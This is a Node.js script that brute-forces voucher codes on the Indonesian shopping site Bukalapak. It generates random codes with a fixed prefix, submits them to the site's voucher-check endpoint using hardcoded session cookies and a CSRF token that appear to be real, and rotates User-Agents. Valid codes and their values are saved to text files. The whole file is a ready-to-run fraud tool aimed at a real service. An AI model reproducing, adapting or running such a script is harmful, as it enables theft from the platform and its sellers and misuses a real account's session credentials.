//ReCode by @RiyanCoday
//KONTOL LAH KLEAN

const rp = require('request-promise');
const random_ua = require('random-ua');
const randstr = require('randomstring');
const inquirer = require('inquirer');
const fs = require('fs');
// 
const base = "BLMOIM";
let length = 4;
//
async function check(code) {
	const option = {
		url: 'https://www.bukalapak.com/payment/purchases/check_voucher.json',
		method: 'POST',
		headers: {
			'Cookie': 'identity=b186a4ff0ae9f81fd1c2ec95a828a7ab; browser_id=00c19844b99528d046acb8aaf97779d3; _ga=GA1.2.1148022183.1480220271; session_id=4d7d3c6f552de2290a66d230ec05576d; _gid=GA1.2.2009545677.1538982515; _vwo_uuid_v2=D82E2E6385D1B5776F6A41C0DEF27AF1C|ef382c39667fe4bfc2d6a6a925346a5d; _gcl_au=1.1.1171405832.1538982516; __auc=d9bb6aa616652819ae04e7e0de1; scs=%7B%22t%22%3A1%7D; ins-gaSSId=6583e066-2f41-06a5-0f92-99f297fabff5_1538986124; ins-mig-done=1; spUID=153898253082923700a79e6.d051d8eb; G_ENABLED_IDPS=google; keyword_parent_id=; current-currency=IDR; __asc=00455036166529020d1c22370b8; keyword_correlation_id=z33joe65z; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%2216652819b32585-00f68f8e8ca9f5-51693374-100200-16652819b34c6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.co.id%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.co.id%22%2C%22__alias%22%3A%20%22219bkl%22%7D; lskjfewjrh34ghj23brjh234=ODZEUFpDaXh4Z0VDUnh3TExVUDZBWk02d1hjMGM0blRWWjlZZURlQnNpR3c4MTRVNmdqWVNXRkJYaFdqRXdra0FNNC84bVVqU3dJTWJEeUgzTFVoV0JZS1MzV1hqYXMwMk54S1lCRVlodG9YcElvY3kyUU9NZGoxMFVYNmhTdHBDVkl5OXViaUEwOU5XdVlQeGx4Y0JsaW1mMnpBZDRYQW1tUS9lM3ZUK09wbjRPRmJYLzdCd2JqQURLdkF0bit5LS1MU3d1Qk1mK3lEYXRTY0g3VXZ3UWF3PT0%3D--2ba8643b4cbad1a6f89ff4ffe480242f5226b884; insdrSV=15; _td=4b6eb719-2c76-4dd2-96bf-d12f43c33e1f; total-cart-amount=2270000',
			'X-NewRelic-ID': 'VQcDWF9ADgIJVVBQ',
			'Origin': 'https://www.bukalapak.com',
			'X-CSRF-Token': 'EAS2Wc5pwF5wYO728/RHF5ouumM8rYHM0gRUlxA8F1O3PD/8y3rhaWWGAntUy995V+4DverSKb7jAzG/8hAdPA==',
			'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			'User-Agent': await random_ua.generate(),
			'Content-Type': 'application/json',
			'Accept': '*/*',
			'Referer': 'https://www.bukalapak.com/payment/purchases/new?product_id=1565181556&product_sku_id=1566382756&seller_ids=%5B1712140%5D',
			'X-Requested-With': 'XMLHttpRequest'
		},
		body: '{"payment_invoice":{"transactions":[{"address":{"province":"","city":""},"amount":450000,"courier_cost":0,"insurance_cost":0,"agent_commission_amount":0,"courier":null,"seller_id":48197902,"retarget_discount_amount":0,"cart_item_ids":[2735899804]}],"payment_method":null,"voucher_amount":0},"payment_details":{"virtual_account_type":""},"voucher_code":"'+code+'"}',
	};
	const start = await rp(option);
	const json = JSON.parse(start);
	return Promise.resolve(json.message);
}

async function generateCode(base, length) {
	return Promise.resolve(base+""+randstr.generate({
		length: length,
		capitalization: 'uppercase'
	}));
}

async function start(base, length, berapakali) {
	for(let i = 0; i < berapakali; i++){
		const kodenya = await generateCode(base, length);
		const checking = await check(kodenya, length);
		if (checking == "Pastikan kamu memasukkan kode voucher yang benar") {
			
		console.log(i+`.DIE ${kodenya} -c0dayTeam`);
		}else if (checking == "Voucher hanya berlaku untuk transaksi di Aplikasi Android Bukalapak dan Aplikasi iOS Bukalapak") {
			fs.appendFileSync('cdy.txt', `${kodenya} [ 200k ] - c0dayTeam \n`);
		console.log(i+`.LIVE ${kodenya} [ 200K ] -c0dayTeam`);
		}else if (checking == "Silakan konfirmasi email akun Bukalapak Anda untuk menggunakan voucher ini.") {
			fs.appendFileSync('50.txt', `${kodenya} [ 50K ] - c0dayTeam \n`);
		console.log(i+`.LIVE ${kodenya} [ 50K ] -c0dayTeam`);
		} else if (checking == "Kuota voucher untuk hari ini sudah habis") {
			
		console.log(i+`.RIP ${kodenya} -c0dayTeam`);
		}else {
			fs.appendFileSync('gg.txt', `${kodenya} [ ${checking} ] - c0dayTeam\n`);
		console.log(i+`.LIVE ${kodenya} [ ${checking} ] -c0dayTeam`);
		}
	}
}

console.log(`Coday - BukaLapak.`)

inquirer.prompt([
	{
		type:'input',
		message:'Mau Berapa Tod? :',
		name:'kalinya',
		validate: function(data) {
			data = data.match(/[0-9]/);
			if (data) return true;
			return 'Only numeric.';
		}
	}
]).then(answers => {
	start(base, length, answers.kalinya);
});
